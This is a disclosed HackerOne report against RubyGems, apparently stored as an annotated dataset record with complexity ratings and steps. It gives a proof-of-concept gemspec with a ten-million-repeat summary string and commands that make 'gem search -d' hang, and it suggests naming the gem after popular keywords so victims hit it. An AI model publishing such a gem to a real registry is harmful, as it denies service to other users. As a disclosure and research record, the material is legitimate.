{
    "reported_to": "RubyGems",
    "reported_by": "mame ",
    "title": "No limit of summary length allows Denail of Service",
    "content": "\nCurrently, there is no limit for summary length. I think, pushing a gem whose summary is huge, will make gem search unavailable.\nThis is not Arbitrary Code Execution, but really easy to attack. According to CVSS v3.0 Calculator, the severity is High (7.5).\nHow to attack\n1) An attacker creates a gem with huge summary string, and push it to rubygems.org.\n2) A victim runs gem search -d <substring-of-the-name-of-the-gem>, but it will give no response.\nIt may be good for the gem name to include a frequently-searched keyword, such as \"foo-rails-bar\" or \"foo-sinatra-bar\".\nProof of concept\n1) Prepare the following gemspec.\nCode 270 Bytes\n1Gem::Specification.new do |spec|\n2  spec.name     = \"huge-summary\"\n3  spec.version  = \"0.0.1\"\n4  spec.authors  = [\"Yusuke Endoh\"]\n5  spec.email    = [\"mame@ruby-lang.org\"]\n6  spec.summary  = \"foo\" * 10000000\n7  spec.homepage = \"http://example.com/\"\n8  spec.license  = \"MIT\"\n9end\n2) Run the following commands\nCode 65 Bytes\n1gem build huge-summary.gemspec\n2gem install huge-summary-0.0.1.gem\n3) Run the following command.\nCode 25 Bytes\n1gem query huge-summary -d\nIt will not answer.\n\n",
    "severity": [
        7.5,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Uncontrolled Resource Consumption"
    ],
    "screenshots": {},
    "disclosed_date": 1504235940,
    "report_url": "https://hackerone.com/reports/243003",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Prepare a gemspec with an extremely long summary string (e.g., 'foo' * 10000000)"
        ],
        [
            2,
            "Build and push the gem to rubygems.org"
        ],
        [
            3,
            "Have a victim search for the gem using 'gem search -d <substring-of-the-name>'"
        ],
        [
            4,
            "Observe that the search command hangs or becomes unresponsive"
        ]
    ],
    "vuln_description": "The vulnerability allows an attacker to create a gem with an excessively long summary string, which can cause denial of service when users attempt to search for the gem. This occurs because the RubyGems system does not enforce any length limits on the summary field, making it possible to overload the search functionality.",
    "reason": "The attack is straightforward and involves only a few simple steps: creating a gem with a long summary and pushing it to the repository. The interaction between the long summary and the search functionality is obvious, and there are no complex states or novel logic involved.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}